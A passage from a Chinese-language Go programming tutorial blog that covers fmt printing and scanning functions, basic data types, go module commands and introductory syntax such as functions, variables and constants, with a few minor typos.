Sprintf() 函数，只不过结果字符串被包装成了 error 类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Errorf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> <span class="hljs-type">error</span><br></code></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    fmt.Print(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>)<br>    fmt.Println(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;d&quot;</span>)<br>    fmt.Printf(<span class="hljs-string">&quot;ab %d %d %d cd\n&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br>    <span class="hljs-comment">// ab1 2 3cd</span><br>    <span class="hljs-comment">// a b 1 2 3 c d</span><br>    <span class="hljs-comment">// ab 1 2 3 cd</span><br><br>    <span class="hljs-keyword">if</span> err := percent(<span class="hljs-number">30</span>, <span class="hljs-number">70</span>, <span class="hljs-number">90</span>, <span class="hljs-number">160</span>); err != <span class="hljs-literal">nil</span> &#123;<br>        fmt.Println(err)<br>    &#125;<br>    <span class="hljs-comment">// 30%</span><br>    <span class="hljs-comment">// 70%</span><br>    <span class="hljs-comment">// 90%</span><br>    <span class="hljs-comment">// 数值 160 超出范围（100）</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">percent</span><span class="hljs-params">(i ...<span class="hljs-type">int</span>)</span></span> <span class="hljs-type">error</span> &#123;<br>    <span class="hljs-keyword">for</span> _, n := <span class="hljs-keyword">range</span> i &#123;<br>        <span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">100</span> &#123;<br>            <span class="hljs-keyword">return</span> fmt.Errorf(<span class="hljs-string">&quot;数值 %d 超出范围（100）&quot;</span>, n)<br>        &#125;<br>        fmt.Print(n, <span class="hljs-string">&quot;%\n&quot;</span>)<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="输入相关函数"><a href="#输入相关函数" class="headerlink" title="输入相关函数"></a>输入相关函数</h3><p><code>Scan()</code>从标准输入中读取数据，并将数据用空白分割并解析后存入 a 提供的变量中（换行符会被当作空白处理），变量必须以指针传入。</p><p>当读到 EOF 或所有变量都填写完毕则停止扫描。</p><p>返回成功解析的参数数量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scan</span><span class="hljs-params">(a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>Scanln</code> 和 <code>Scan</code> 类似，只不过遇到换行符就停止扫描。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanln</span><span class="hljs-params">(a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>Scanf</code> 从标准输入中读取数据，并根据格式字符串 format 对数据进行解析，将解析结果存入参数 a 所提供的变量中，变量必须以指针传入。</p><p>输入端的换行符必须和 format 中的换行符相对应（如果格式字符串中有换行符，则输入端必须输入相应的换行符）。</p><p>占位符 %c 总是匹配下一个字符，包括空白，比如空格符、制表符、换行符。</p><p>返回成功解析的参数数量。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Scanf</span><span class="hljs-params">(format <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>以下三个函数功能同上面三个函数，只不过从 r 中读取数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fscan</span><span class="hljs-params">(r io.Reader, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fscanln</span><span class="hljs-params">(r io.Reader, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Fscanf</span><span class="hljs-params">(r io.Reader, format <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p>以下三个函数功能同上面三个函数，只不过从 str 中读取数据。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sscan</span><span class="hljs-params">(str <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sscanln</span><span class="hljs-params">(str <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Sscanf</span><span class="hljs-params">(str <span class="hljs-type">string</span>, format <span class="hljs-type">string</span>, a ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> (n <span class="hljs-type">int</span>, err <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-comment">// 对于 Scan 而言，回车视为空白</span><br>func <span class="hljs-selector-tag">main</span>() &#123;<br>    <span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c := <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, false<br>    fmt<span class="hljs-selector-class">.Scan</span>(&amp;<span class="hljs-selector-tag">a</span>, &amp;<span class="hljs-selector-tag">b</span>, &amp;c)<br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c)<br>    <span class="hljs-comment">// 在终端执行后，输入 abc 1 回车 true 回车</span><br>    <span class="hljs-comment">// 结果 abc 1 true</span><br>&#125;<br><br><span class="hljs-comment">// 对于 Scanln 而言，回车结束扫描</span><br>func <span class="hljs-selector-tag">main</span>() &#123;<br>    <span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c := <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, false<br>    fmt<span class="hljs-selector-class">.Scanln</span>(&amp;<span class="hljs-selector-tag">a</span>, &amp;<span class="hljs-selector-tag">b</span>, &amp;c)<br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c)<br>    <span class="hljs-comment">// 在终端执行后，输入 abc 1 true 回车</span><br>    <span class="hljs-comment">// 结果 abc 1 true</span><br>&#125;<br><br><span class="hljs-comment">// 格式字符串可以指定宽度</span><br>func <span class="hljs-selector-tag">main</span>() &#123;<br>    <span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c := <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-number">0</span>, false<br>    fmt<span class="hljs-selector-class">.Scanf</span>(<span class="hljs-string">&quot;%4s%d%t&quot;</span>, &amp;<span class="hljs-selector-tag">a</span>, &amp;<span class="hljs-selector-tag">b</span>, &amp;c)<br>    fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, c)<br>    <span class="hljs-comment">// 在终端执行后，输入 1234567true 回车</span><br>    <span class="hljs-comment">// 结果 1234 567 true</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Go语言数据结构"><a href="#Go语言数据结构" class="headerlink" title="Go语言数据结构"></a>Go语言数据结构</h2><h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-built_in">bool</span><br>布尔型变量只能为常量<span class="hljs-literal">true</span>或<span class="hljs-literal">false</span>，默认为<span class="hljs-literal">false</span>。<br></code></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//示例代码</span><br><span class="hljs-keyword">var</span> isActive <span class="hljs-type">bool</span>  <span class="hljs-comment">// 全局变量声明</span><br><span class="hljs-keyword">var</span> enabled, disabled = <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>  <span class="hljs-comment">// 忽略类型的声明</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-keyword">var</span> available <span class="hljs-type">bool</span>  <span class="hljs-comment">// 一般声明</span><br>    valid := <span class="hljs-literal">false</span>      <span class="hljs-comment">// 简短声明</span><br>    available = <span class="hljs-literal">true</span>    <span class="hljs-comment">// 赋值操作</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数字类型"><a href="#数字类型" class="headerlink" title="数字类型"></a>数字类型</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-type">uint8</span><br>无符号<span class="hljs-number">8</span>位整型<br><span class="hljs-type">uint16</span><br>无符号<span class="hljs-number">16</span>位整型<br><span class="hljs-type">uint32</span><br>无符号<span class="hljs-number">8</span>位整型<br><span class="hljs-type">uint64</span><br>无符号<span class="hljs-number">64</span>位整型<br><br><span class="hljs-type">int8</span><br>有符号<span class="hljs-number">8</span>位整型<br><span class="hljs-type">int16</span><br>有符号<span class="hljs-number">16</span>位整型<br><span class="hljs-type">int32</span><br>有符号<span class="hljs-number">32</span>位整型<br><span class="hljs-type">int64</span><br>有符号<span class="hljs-number">64</span>位整型<br><br><span class="hljs-type">float32</span><br>IEEE<span class="hljs-number">-754</span> <span class="hljs-number">32</span>位浮点型数<br><span class="hljs-type">float64</span><br>IEEE<span class="hljs-number">-754</span> <span class="hljs-number">64</span>位浮点型数<br><span class="hljs-type">complex64</span><br><span class="hljs-number">32</span> 位实数和虚数<br><span class="hljs-type">complex128</span><br><span class="hljs-number">64</span> 位实数和虚数<br><br><span class="hljs-type">byte</span><br>字节流，类似<span class="hljs-type">uint8</span><br><span class="hljs-type">rune</span><br>类似于<span class="hljs-type">int32</span>，表示一个Unicode码点<br><span class="hljs-type">uint</span><br>无符号<span class="hljs-number">32</span>或<span class="hljs-number">64</span>位<br><span class="hljs-type">int</span><br>有符号<span class="hljs-number">32</span>或<span class="hljs-number">64</span>位<br>uintpte<br>无符号整型，用于存放指针<br></code></pre></td></tr></table></figure><p>从Go1.9版本开始，对于数字类型，无需定义int及float32、float64，系统会自动识别。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stylus">package <span class="hljs-selector-tag">main</span><br>import <span class="hljs-string">&quot;fmt&quot;</span><br><br>func <span class="hljs-selector-tag">main</span>() &#123;<br>   <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">a</span> = <span class="hljs-number">1.5</span><br>   <span class="hljs-selector-tag">var</span> <span class="hljs-selector-tag">b</span> =<span class="hljs-number">2</span><br>   fmt<span class="hljs-selector-class">.Println</span>(<span class="hljs-selector-tag">a</span>,b)<br>&#125;<br><span class="hljs-comment">//运行结果</span><br><span class="hljs-comment">//1.5 2</span><br></code></pre></td></tr></table></figure><h3 id="派生类型"><a href="#派生类型" class="headerlink" title="派生类型"></a>派生类型</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">(a) 指针类型（Pointer）<br>(b) 数组类型<br>(c) 结构化类型(struct)<br>(d) Channel 类型<br>(e) 函数类型<br>(f) 切片类型<br>(g) 接口类型（interface）<br>(h) Map 类型<br></code></pre></td></tr></table></figure><h2 id="Go安装依赖包"><a href="#Go安装依赖包" class="headerlink" title="Go安装依赖包"></a>Go安装依赖包</h2><p>安装完成Golang之后，我们可以使用<code>go env</code>，查看基本配置信息</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">GOPATH</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/*/*/*&quot;</span><br><span class="hljs-attribute">GOROOT</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;/*/*/*&quot;</span><br><span class="hljs-attribute">GOBIN</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Go-get"><a href="#Go-get" class="headerlink" title="Go get"></a>Go get</h3><p>go get 命令可以借助代码管理工具通过远程拉取或更新代码包及其依赖包，并自动完成编译和安装。整个过程就像安装一个 App 一样简单。</p><p><strong>使用go get命令下载指定版本的依赖包</strong></p><p>执行<code>go get </code>命令，在下载依赖包的同时还可以指定依赖包的版本。</p><ul><li>运行<code>go get -u</code>命令会将项目中的包升级到最新的次要版本或者修订版本；</li><li>运行<code>go get -u=patch</code>命令会将项目中的包升级到最新的修订版本；</li><li>运行<code>go get [包名]@[版本号]</code>命令会下载对应包的指定版本或者将对应包升级到指定的版本。</li></ul><h3 id="Go-module"><a href="#Go-module" class="headerlink" title="Go module"></a>Go module</h3><p>go module是go官方自带的go依赖管理库,在1.13版本正式推荐使用</p><p>go module可以将某个项目(文件夹)下的所有依赖整理成一个 go.mod 文件,里面写入了依赖的版本等</p><p><strong>使用go module之后我们可不用将代码放置在<code>src</code>下了</strong></p><h4 id="开启Go-module"><a href="#开启Go-module" class="headerlink" title="开启Go module"></a>开启Go module</h4><p>go在1.13版本默认是auto，1.13+的版本判断开不开启MODULE的依据是根目录下有没有go.mod文件。</p><p>我们也可手动更改为 on(全部开启)&#x2F;off(全部不开启)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># Windows</span><br><span class="hljs-built_in">set</span> <span class="hljs-attribute">GO111MODULE</span>=on<br><span class="hljs-comment"># Linux</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GO111MODULE</span>=on<br><span class="hljs-comment"># mac</span><br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GO111MODULE</span>=on<br></code></pre></td></tr></table></figure><h3 id="Go-module基本命令"><a href="#Go-module基本命令" class="headerlink" title="Go module基本命令"></a>Go module基本命令</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在创建一个新的Golang项目时，我们可能没有创建<code>go.mod</code>文件，因此我们可以使用下面命令初始化一个module，模块名为你的项目名。</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span> <span class="hljs-built_in">mod</span> init &lt;模块名&gt;<br></code></pre></td></tr></table></figure><p>可以看到已经初始化了<code>go.mod</code>，只是内部没有任何依赖信息。</p><p><img src="https://img-blog.csdnimg.cn/direct/fb5dd9d1e223415c95e4fca9316f9eca.png" alt="image-20230322160033269"></p><h4 id="更新依赖"><a href="#更新依赖" class="headerlink" title="更新依赖"></a>更新依赖</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span> <span class="hljs-built_in">mod</span> tidy<br></code></pre></td></tr></table></figure><p><code>tidy</code>会检测该文件夹目录下所有引入的依赖，并写入<code>go.mod</code>，不使用或错误的依赖也会自动进行删除。</p><h4 id="下载依赖"><a href="#下载依赖" class="headerlink" title="下载依赖"></a>下载依赖</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span> <span class="hljs-built_in">mod</span> download<br></code></pre></td></tr></table></figure><p>目前所有模块版本数据均缓存在<code>$GOPATH/pkg/mod</code>和 <code>$GOPATH/pkg/sum</code>下，同时会在项目根目录下生成 go.sum 文件, 该文件是依赖的详细依赖。</p><h4 id="导入依赖"><a href="#导入依赖" class="headerlink" title="导入依赖"></a>导入依赖</h4><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima"><span class="hljs-built_in">go</span> <span class="hljs-built_in">mod</span> vendor<br></code></pre></td></tr></table></figure><p>我们的依赖下载完成后是存储了<code>$GOPATH</code>目录下的，如果有特殊需要，需要将<code>GOPATH</code>下的依赖转移至该项目根目录下的 vendor(自动新建) 文件夹下，可以使用该命令。</p><h4 id="校验依赖"><a href="#校验依赖" class="headerlink" title="校验依赖"></a>校验依赖</h4><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">go <span class="hljs-built_in">mod</span> <span class="hljs-built_in">verify</span><br></code></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/weixin_41519463/article/details/103501485">go安装依赖包（go get, go module）</a></p><h2 id="Go语言基础知识"><a href="#Go语言基础知识" class="headerlink" title="Go语言基础知识"></a>Go语言基础知识</h2><p><a href="https://go-zh.org/">https://go-zh.org/</a></p><p><a href="https://tour.go-zh.org/">Go语言之旅</a></p><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p>每个 Go 程序都是由包构成的。</p><p>程序默认从<code>main</code>包开始运行。</p><p>按照约定，包名与导入路径的最后一个元素一致。例如，<code>&quot;math/rand&quot;</code> 包中的源码均以 <code>package rand</code> 语句开始。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math/rand&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;My favorite number is&quot;</span>, rand.Intn(<span class="hljs-number">10</span>))<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>导入</strong></p><p>Go语言与python类似，都是能够导入其他程序包，导入方式一般有两种，分组导入或多个导入语句</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 导入多条语句</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;math&quot;</span><br><br><span class="hljs-comment">// 分组导入</span><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;math&quot;</span><br>)<br></code></pre></td></tr></table></figure><p><strong>导出名</strong></p><p>在Go中，以大写字母开头，那么它就是<strong>已导出的</strong>。<strong>已导出</strong>表示能够在包外访问，Go语言中调用其他包的函数都是已导出的函数。</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><strong>函数类型声明</strong></p><p>go语言的函数声明与C语言函数声明类似，函数可以没有参数或接受多个参数，但是与c语言不同的是，函数参数类型说明位置不同，关于Go语言为什么采用这种声明方式，可以参考<a href="https://blog.go-zh.org/gos-declaration-syntax">这篇文章</a>，总而言之Go 的声明从左到右阅读，C 的声明是螺旋式的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// c语言函数声明</span><br><span class="hljs-type">int</span> add(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y)<br>&#123;...&#125;<br><br><span class="hljs-comment">// go语言函数声明</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x <span class="hljs-type">int</span>,y <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span><br>&#123;...&#125;<br></code></pre></td></tr></table></figure><p>go语言中函数类型是可以省略的，<strong>当连续两个或多个函数的已命名形参类型相同时，除最后一个类型外，其他都可以省略</strong>。上述例子简写为：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">(x,y <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">int</span><br>&#123;&#125;<br></code></pre></td></tr></table></figure><p><strong>多值返回</strong></p><p>go语言中的函数能够返回任意数量的返回值，这是c语言所不具有的。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">swap</span><span class="hljs-params">(x, y <span class="hljs-type">string</span>)</span></span> (<span class="hljs-type">string</span>, <span class="hljs-type">string</span>) &#123;<br><span class="hljs-keyword">return</span> y, x<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>命名返回值</strong></p><p>Go 的返回值可被命名，它们会被视作定义在函数顶部的变量。没有参数的 <code>return</code> 语句返回已命名的返回值。也就是 <code>直接</code> 返回。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">split</span><span class="hljs-params">(sum <span class="hljs-type">int</span>)</span></span> (x, y <span class="hljs-type">int</span>) &#123;<br>x = sum * <span class="hljs-number">4</span> / <span class="hljs-number">9</span><br>y = sum - x<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p><code>var</code> 语句用于声明一个变量列表，跟函数的参数列表一样，类型在最后。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> c, python, java <span class="hljs-type">bool</span><br></code></pre></td></tr></table></figure><p>同时变量也可以进行初始化操作，每个变量对应一个。如果初始化值存在，可以省略类型；变量会从初始值中获取类型。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> i, j <span class="hljs-type">int</span> = <span class="hljs-number">1</span>, <span class="hljs-number">2</span><br><span class="hljs-keyword">var</span> c, python, java = <span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>, <span class="hljs-string">&quot;no!&quot;</span><br></code></pre></td></tr></table></figure><p><strong>短变量</strong></p><p>在函数中，简洁赋值语句 <code>:=</code> 可在类型明确的地方代替 <code>var</code> 声明<strong>。函数外的每个语句都必须以关键字开始（<code>var</code>, <code>func</code> 等等）</strong>，因此 <code>:=</code> 结构不能在函数外使用。</p><p><strong>零值</strong></p><p>没有明确初始值的变量声明会被赋予它们的 <strong>零值</strong>。</p><p>零值是：</p><ul><li>数值类型为 <code>0</code>，</li><li>布尔类型为 <code>false</code>，</li><li>字符串为 <code>&quot;&quot;</code>（空字符串）</li></ul><p><strong>类型转换</strong></p><p>Go语言类型转换是显式类型转换，表达式 <code>T(v)</code> 将值 <code>v</code> 转换为类型 <code>T</code>。</p><p>一些关于数值的转换：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> i <span class="hljs-type">int</span> = <span class="hljs-number">42</span><br><span class="hljs-keyword">var</span> f <span class="hljs-type">float64</span> = <span class="hljs-type">float64</span>(i)<br><span class="hljs-keyword">var</span> u <span class="hljs-type">uint</span> = <span class="hljs-type">uint</span>(f)<br></code></pre></td></tr></table></figure><h3 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h3><p>常量的声明与变量类似，只不过是使用 <code>const</code> 关键字。</p><p>常量可以是字符、字符串、布尔值或数值。</p><p>常量不能用 <code>:=</code> 语法声明。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">const</span> Pi = <span class="hljs-number">3.14</span><br></code></pre></td></tr></table></figure><p><strong>iota</strong></p><p>iota，特殊常量，可以认为是一个可以被编译器修改的常量。</p><p>iota 在 const关键字出现时将被重置为 